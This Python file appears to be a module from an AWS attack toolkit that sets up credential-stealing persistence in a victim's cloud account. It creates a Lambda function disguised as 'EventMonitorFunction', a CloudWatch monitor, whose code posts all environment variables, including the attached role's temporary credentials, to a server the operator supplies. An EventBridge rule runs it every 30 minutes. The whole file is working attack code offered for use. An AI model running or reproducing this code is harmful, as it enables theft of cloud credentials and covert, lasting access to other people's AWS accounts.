import boto3
import botocore
import os
import time
import zipfile
from colorama import Fore, Style
from functions import create_client

def help():
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")
    print("[+] Module Description:\n")
    print("\tThis module will create a lambda persistency that will export the temporary credentials")
    print("\tfor the role attached to it to a server of your choosing.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will ask you for an address of a server you control, the arn of a role to be")
    print("\tpassed to the new lambda function and the region to create the lambda. It then will create")
    print("\tthe lambda function and assign a trigger that will execute this function every 30 minutes.\n")

    print("[+] IMPORTANT:\n")
    print("\tYou need the 'iam:passrole' and 'lambda:create_function' permissions.")
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")

def aws_file():
    with open("lambda_function.zip", 'rb') as file_data:
        bytes_content = file_data.read()

    return bytes_content

def create_lambda(client, function_role):
    response = client.create_function(
        FunctionName="EventMonitorFunction",
        Runtime="python3.9",
        Role=function_role,
        Handler="lambda_function.lambda_handler",
        Code={
            "ZipFile": aws_file()
        },
        Description="Lambda de monitoramento de Eventos do CloudWatch.",
        Publish=True,
        PackageType="Zip"
       )

    return response

def create_eventbrige_rule(client):
    rule = client.put_rule(
        Name='EventMonitor',
        ScheduleExpression="rate(30 minutes)",
        Description="Monitora eventos do CloudWath."
    )

    return rule

def create_lambda_file(server_address, lambda_path):
    lambda_code = f"""
import json
import os
import requests

def lambda_handler(event, context):
    environment = os.environ.copy()
    requests.post('http://{server_address}/', json=environment, timeout=0.01)
    return '200 OK'
"""

    try:
        print('[+] Zipping Lambda function...\n')
        with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('lambda_function.py', lambda_code)
    except Exception as e:
        print('Failed to zip Lambda: {}\n'.format(e))

def assign_rule_target(client,function_name, function_arn):
    response = client.put_targets(
        Rule="EventMonitor",
        Targets=[
            {
                'Id': function_name,
                'Arn': function_arn
            }
        ]
    )

    return response

def assign_trigger(client, function_name, rule_arn):
    response = client.add_permission(
        FunctionName=function_name,
        StatementId='EventBridgeFunctionPermission',
        Action='lambda:InvokeFunction',
        Principal='events.amazonaws.com',
        SourceArn=rule_arn
    )

    return response

def create_lambda_layer(client):
    with open("./data/requests.zip", 'rb') as file_data:
        bytes_content = file_data.read()
    response = client.publish_layer_version(
            LayerName='layer_requests',
        Description='Used to perform standard HTTP requests.',
        Content={'ZipFile': bytes_content},
        CompatibleRuntimes=['python3.9']
    )

    return response 

def check_lambda_status(client, function_name):
    response = client.get_function(
        FunctionName=function_name
    )

    if response['Configuration']['State'] == 'Active':
        return True
    else:
        return False

def invoke_lambda(client, function_name):
    response = client.invoke(
        FunctionName=function_name,
    )

    return response

def update_layer_information(client, function_name):
    response = client.update_function_configuration(
        FunctionName=function_name,
        Layers=[
            'arn:aws:lambda:sa-east-1:601904299386:layer:layer_requests:1'
        ]
    )

    return response

def main(botoconfig, session):
    results = {}

    print("[+] Starting persistence module...")
    function_role = input("[+] Please input the " + Fore.YELLOW + "role arn" + Style.RESET_ALL + " to be passed to the Lambda function: ")
    region_name = input("[+] Please input the " + Fore.YELLOW + "region" + Style.RESET_ALL + " to be used: ")
    server_address = input("[+] Please input the " + Fore.YELLOW + "server address" + Style.RESET_ALL + " to be used: ")
    lambda_path = './lambda_function.zip'

    print("[+] Creating Lambda file...")
    create_lambda_file(server_address, lambda_path)

    print("[+] Creating EventBridge Rule...")
    event_client = create_client.Client(botoconfig, session, "events", region_name)
    rule_data = create_eventbrige_rule(event_client.create_aws_client())
    print(f"[+] Rule created: {Fore.GREEN}{rule_data['RuleArn']}{Style.RESET_ALL}")
    results['RuleArn'] = rule_data['RuleArn'] 

    print("[+] Creating Lambda Function...")
    lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
    function_data = create_lambda(lambda_client.create_aws_client(), function_role)
    print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
    results['FunctionName'] = function_data['FunctionName']
    results['FunctionArn'] = function_data['FunctionArn']
    
    print("[+] Assigning target to EventBridge rule...")
    target = assign_rule_target(event_client.create_aws_client(), function_data['FunctionName'], function_data['FunctionArn'])
    if target ['ResponseMetadata']['HTTPStatusCode'] == 200:
        print(f"{Fore.GREEN}[+] Targed Successfully Assinged!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to assign target...{Style.RESET_ALL}")

    print("[+] Assigning trigger to Lambda function...")
    trigger = assign_trigger(lambda_client.create_aws_client(), function_data['FunctionName'], rule_data['RuleArn'])
    if trigger['ResponseMetadata']['HTTPStatusCode'] == 201:
        print(f"{Fore.GREEN}[+] Trigger set!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to set Trigger, attack failed...{Style.RESET_ALL}")

    print("[+] Creating Lambda Layer...")
    layer_client = boto3.client("lambda", config=botoconfig, region_name=region_name)
    layer_information = create_lambda_layer(layer_client)
    if layer_information['ResponseMetadata']['HTTPStatusCode'] == 201:
        print(f"{Fore.GREEN}[+] Layer created!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to create layer, attack failed...{Style.RESET_ALL}")

    print("[+] Checking for lambda status...")
    while True:
        token = check_lambda_status(layer_client, function_data['FunctionName'])
        if token:
            break
        else:
            time.sleep(10)

    print("[+] Assingning Layer to Function...")
    update_layer = update_layer_information(layer_client, function_data['FunctionName'])
    if update_layer['ResponseMetadata']['HTTPStatusCode'] == 200:
        print(f"{Fore.GREEN}[+] Layer assigned! Attack Complete!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to assign layer, attack failed...{Style.RESET_ALL}")

    os.remove(lambda_path)

    return results